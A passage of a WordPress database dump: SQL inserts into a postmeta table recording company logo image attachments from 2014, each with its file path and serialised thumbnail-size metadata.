INSERT INTO `cmrfu_postmeta` VALUES("2045","960","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:27:\"2014/08/logo_0004_viko1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"logo_0004_viko1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"logo_0004_viko1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"logo_0004_viko1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2046","961","_wp_attached_file","2014/08/logo_0005_siemens1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2047","961","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:30:\"2014/08/logo_0005_siemens1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"logo_0005_siemens1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"logo_0005_siemens1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"logo_0005_siemens1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2048","962","_wp_attached_file","2014/08/logo_0007_seranit1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2049","962","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:30:\"2014/08/logo_0007_seranit1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"logo_0007_seranit1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"logo_0007_seranit1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"logo_0007_seranit1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2050","963","_wp_attached_file","2014/08/logo_0008_scavolini1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2051","963","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:32:\"2014/08/logo_0008_scavolini1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:32:\"logo_0008_scavolini1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:32:\"logo_0008_scavolini1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:30:\"logo_0008_scavolini1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2052","964","_wp_attached_file","2014/08/logo_0009_rehau1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2053","964","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:28:\"2014/08/logo_0009_rehau1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"logo_0009_rehau1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"logo_0009_rehau1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"logo_0009_rehau1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2054","965","_wp_attached_file","2014/08/logo_0010_onalanlar1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2055","965","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:32:\"2014/08/logo_0010_onalanlar1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:32:\"logo_0010_onalanlar1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:32:\"logo_0010_onalanlar1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:30:\"logo_0010_onalanlar1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2056","966","_wp_attached_file","2014/08/logo_0011_lineadecor1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2057","966","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:33:\"2014/08/logo_0011_lineadecor1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:33:\"logo_0011_lineadecor1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:33:\"logo_0011_lineadecor1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:31:\"logo_0011_lineadecor1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2058","967","_wp_attached_file","2014/08/logo_0012_legrand1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2059","967","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:30:\"2014/08/logo_0012_legrand1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"logo_0012_legrand1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"logo_0012_legrand1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"logo_0012_legrand1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2060","968","_wp_attached_file","2014/08/logo_0013_kommerling1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2061","968","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:33:\"2014/08/logo_0013_kommerling1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:33:\"logo_0013_kommerling1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:33:\"logo_0013_kommerling1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:31:\"logo_0013_kommerling1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2062","969","_wp_attached_file","2014/08/logo_0014_intema.png");
INSERT INTO `cmrfu_postmeta` VALUES("2063","969","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:28:\"2014/08/logo_0014_intema.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"logo_0014_intema-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"logo_0014_intema-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"logo_0014_intema-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2064","970","_wp_attached_file","2014/08/logo_0015_huni1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2065","970","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:27:\"2014/08/logo_0015_huni1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"logo_0015_huni1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"logo_0015_huni1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"logo_0015_huni1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2066","971","_wp_attached_file","2014/08/logo_0016_hoppe1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2067","971","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:28:\"2014/08/logo_0016_hoppe1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"logo_0016_hoppe1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"logo_0016_hoppe1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"logo_0016_hoppe1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2068","972","_wp_attached_file","2014/08/logo_0018_fibrobeton1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2069","972","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:33:\"2014/08/logo_0018_fibrobeton1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:33:\"logo_0018_fibrobeton1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:33:\"logo_0018_fibrobeton1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:31:\"logo_0018_fibrobeton1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2070","973","_wp_attached_file","2014/08/logo_0019_betofiber1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2071","973","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:32:\"2014/08/logo_0019_betofiber1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:32:\"logo_0019_betofiber1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:32:\"logo_0019_betofiber1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:30:\"logo_0019_betofiber1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2072","974","_wp_attached_file","2014/08/logo_0020_aparici1.png");
INSERT INTO `cmrfu_postmeta` VALUES("2073","974","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:30:\"2014/08/logo_0020_aparici1.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"logo_0020_aparici1-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"logo_0020_aparici1-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"logo_0020_aparici1-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2074","975","_wp_attached_file","2014/08/logo_0021_innsu.png");
INSERT INTO `cmrfu_postmeta` VALUES("2075","975","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:27:\"2014/08/logo_0021_innsu.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"logo_0021_innsu-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"logo_0021_innsu-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"logo_0021_innsu-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2076","976","_wp_attached_file","2014/08/logo_0022_eskiz.png");
INSERT INTO `cmrfu_postmeta` VALUES("2077","976","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:27:\"2014/08/logo_0022_eskiz.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"logo_0022_eskiz-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"logo_0022_eskiz-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"logo_0022_eskiz-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2078","977","_wp_attached_file","2014/08/logo_0023_toskar.png");
INSERT INTO `cmrfu_postmeta` VALUES("2079","977","_wp_attachment_metadata","a:5:{s:5:\"width\";i:200;s:6:\"height\";i:125;s:4:\"file\";s:28:\"2014/08/logo_0023_toskar.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:28:\"logo_0023_toskar-150x125.png\";s:5:\"width\";i:150;s:6:\"height\";i:125;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:28:\"logo_0023_toskar-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"logo_0023_toskar-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2080","978","_wp_attached_file","2014/08/md_prekast.png");
INSERT INTO `cmrfu_postmeta` VALUES("2081","978","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:22:\"2014/08/md_prekast.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:22:\"md_prekast-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:22:\"md_prekast-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:20:\"md_prekast-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2082","979","_wp_attached_file","2014/08/okcam_mobilya.png");
INSERT INTO `cmrfu_postmeta` VALUES("2083","979","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:25:\"2014/08/okcam_mobilya.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:25:\"okcam_mobilya-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:25:\"okcam_mobilya-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:23:\"okcam_mobilya-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2084","980","_wp_attached_file","2014/08/Pimapen-011.png");
INSERT INTO `cmrfu_postmeta` VALUES("2085","980","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:23:\"2014/08/Pimapen-011.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:23:\"Pimapen-011-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:23:\"Pimapen-011-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:21:\"Pimapen-011-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2086","981","_wp_attached_file","2014/08/seldur_elektrik.png");
INSERT INTO `cmrfu_postmeta` VALUES("2087","981","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:27:\"2014/08/seldur_elektrik.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"seldur_elektrik-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"seldur_elektrik-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"seldur_elektrik-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2088","982","_wp_attached_file","2014/08/serifoglu-011.png");
